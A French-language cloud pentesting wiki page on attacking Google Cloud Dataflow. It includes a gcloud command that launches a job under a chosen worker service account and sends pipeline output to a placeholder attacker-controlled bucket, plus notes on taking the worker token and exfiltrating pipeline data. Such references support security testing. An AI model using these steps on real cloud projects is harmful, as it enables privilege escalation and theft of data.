---
title: "Dataflow : le compte de service worker et les données du pipeline"
order: 5
description: "Attaquer les jobs Dataflow : le compte de service worker et l'accès du pipeline aux données sources et de destination."
keywords:
  - Dataflow
  - worker service account
  - pipeline
  - job
  - Apache Beam
  - data
---

# Dataflow

Dataflow exécute des pipelines Apache Beam managés sur des VM worker qui portent un **compte de service worker**. Le lancement d'un job exécute le code du pipeline sur ces workers sous l'identité de ce compte, et le pipeline lit et écrit dans les sources et destinations pour lesquelles il est configuré (GCS, BigQuery, Pub/Sub). Un job que vous contrôlez atteint donc à la fois le jeton du worker et les données en transit.

## Lancer un pipeline

```bash
gcloud dataflow jobs list --region <region>
# a custom or template job runs as --service-account-email on the workers
gcloud dataflow jobs run <name> --region <region> \
  --gcs-location gs://<template> \
  --service-account-email <worker-sa> \
  --parameters inputFile=gs://<src>,output=gs://<attacker-sink>
```

## Notes d'exploitation

- `dataflow.jobs.create` avec un compte de service worker choisi correspond au chemin de déploiement de type [actAs](../identity/privilege-escalation/act-as-deployment/dataproc.md) ; le serveur de métadonnées du worker livre le jeton.
- Les pipelines déplacent fréquemment des données de grande valeur (flux d'événements, exports d'entrepôt de données) ; rediriger la destination vers un bucket que vous contrôlez permet de les exfiltrer.

## Outils

- **gcloud** (`dataflow jobs list/run`).

## Références

- [HackTricks Cloud: GCP Dataflow](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google Cloud: Dataflow security and permissions](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
